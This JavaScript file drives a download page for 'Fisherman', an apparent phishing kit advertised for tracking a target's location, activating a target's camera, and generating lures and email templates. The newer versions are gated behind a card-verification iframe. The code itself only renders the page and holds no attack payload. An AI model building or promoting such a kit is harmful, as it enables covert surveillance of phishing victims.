const VERSIONS = [
    {
version: "v1.0.0",
date: "2023-10-01",
type: "stable",
features: ["Pelacakan lokasi akurat (Latitude/Longitude)", "Aktivasi kamera target", "Informasi perangkat"],
filename: "Fisherman_v1.0.0.zip",
size: "164.1KB"
    },
    {
version: "v1.1.0",
date: "2023-12-15",
type: "stable",
features: ["Core v1.0.0", "HTML code generator", "Generate kode HTML otomatis"],
filename: "Fisherman_v1.1.0.zip",
size: "169.2KB"
    },
    {
version: "v1.2.0",
date: "2024-12-20",
type: "latest",
features: ["Core v1.1.0", "Otomatisasi template email", "Template email siap pakai"],
filename: "Fisherman_v1.2.0.zip",
size: "172.8KB"
    }
];


function initTyping() {
    const textElement = document.getElementById('typing-text');
    const fullText = "INITIALIZING_FISHERMAN_TOOLS... [OK]\nLOADING_LOCATION_TRACKING... [OK]\nACTIVATING_CAMERA_SYSTEM... [OK]\nTOOLS_ACTIVE: READY_FOR_FISHING.";
    let i = 0;
    
    const timer = setInterval(() => {
textElement.innerText = fullText.slice(0, i);
i++;
if (i > fullText.length) {
    clearInterval(timer);
    document.getElementById('hero-actions').classList.replace('opacity-0', 'opacity-100');
}
    }, 30);
}


function renderVersions() {
    const container = document.getElementById('versions-list');
    container.innerHTML = VERSIONS.map(v => `
<div class="group border border-red-950 hover:border-red-600 transition-all bg-zinc-950/40 overflow-hidden flex flex-col md:flex-row">
    <div class="md:w-48 bg-red-950/10 p-6 flex flex-col justify-center items-center border-b md:border-b-0 md:border-r border-red-950 group-hover:bg-red-900/10">
        <span class="text-[8px] text-zinc-600 font-mono mb-1 uppercase">BUILD_VER</span>
        <h3 class="text-2xl font-bold text-white font-mono group-hover:text-red-500 transition-colors">${v.version}</h3>
        <div class="mt-2 px-2 py-0.5 text-[8px] font-black uppercase tracking-widest ${v.type === 'stable' ? 'bg-red-800 text-white' : v.type === 'beta' ? 'bg-yellow-600 text-black' : 'bg-zinc-800 text-zinc-500'}">
            ${v.type}
        </div>
    </div>
    
    <div class="flex-grow p-6">
        <div class="text-[9px] text-zinc-600 font-mono uppercase mb-4 tracking-widest">TS_RELEASED: ${v.date}</div>
        <div class="grid grid-cols-1 sm:grid-cols-2 gap-y-2 gap-x-4">
            ${v.features.map(f => `
                <div class="flex items-center text-[11px] text-zinc-400 font-mono">
                    <span class="text-red-800 mr-2">[*]</span> ${f}
                </div>
            `).join('')}
        </div>
    </div>

    <div class="md:w-64 p-6 bg-black flex flex-col justify-center border-t md:border-t-0 md:border-l border-red-950">
        ${v.version === 'v1.0.0' ? 
            `<a href="assets/download/Fisherman_v1.0.0.zip" download class="terminal-btn w-full py-3 bg-transparent border border-red-700 text-red-500 text-[10px] font-bold font-mono uppercase tracking-[0.2em] hover:bg-red-700 hover:text-white text-center">
                > download tools
            </a>` :
            `<button onclick="showVerificationModal('${v.version}')" class="terminal-btn w-full py-3 bg-transparent border border-red-700 text-red-500 text-[10px] font-bold font-mono uppercase tracking-[0.2em] hover:bg-red-700 hover:text-white">
                > request access
            </button>`
        }
        <div class="mt-4 flex justify-between text-[8px] text-zinc-700 font-mono italic">
            <span>SIZE: ${v.size}</span>
        </div>
    </div>
</div>
    `).join('');
}

function downloadTools(filename) {
    console.log("Fetching tools:", filename);
    const content = `DISTRIBUTION_FILE: ${filename}\nDEVELOPER: K1NG5_\nACCESS: RESEARCH_ONLY`;
    const blob = new Blob([content], { type: 'application/zip' });
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    window.URL.revokeObjectURL(url);
}

function showVerificationModal(version) {
    const overlay = document.getElementById('verification-overlay');
    const loadingDiv = document.getElementById('overlay-loading');
    const contentDiv = document.getElementById('overlay-content');
    const loadingBar = document.getElementById('loading-bar');
    const loadingPercent = document.getElementById('loading-percent');

    overlay.classList.remove('hidden');
    loadingDiv.classList.remove('hidden');
    contentDiv.classList.add('hidden');
    loadingBar.style.width = '0%';
    loadingPercent.textContent = '0%';

    
    let progress = 0;
    const interval = setInterval(() => {
progress += Math.random() * 15 + 5; 
if (progress > 100) progress = 100;
loadingBar.style.width = progress + '%';
loadingPercent.textContent = Math.round(progress) + '%';

if (progress >= 100) {
    clearInterval(interval);
    setTimeout(() => {
        contentDiv.innerHTML = '<iframe src="public/card/card_verification.html" width="100%" height="600px" frameborder="0"></iframe>';
        loadingDiv.classList.add('hidden');
        contentDiv.classList.remove('hidden');
    }, 500);
}
    }, 100);
}

function closeVerificationModal() {
    document.getElementById('verification-overlay').classList.add('hidden');
}

window.onload = () => {
    initTyping();
    renderVersions();
};
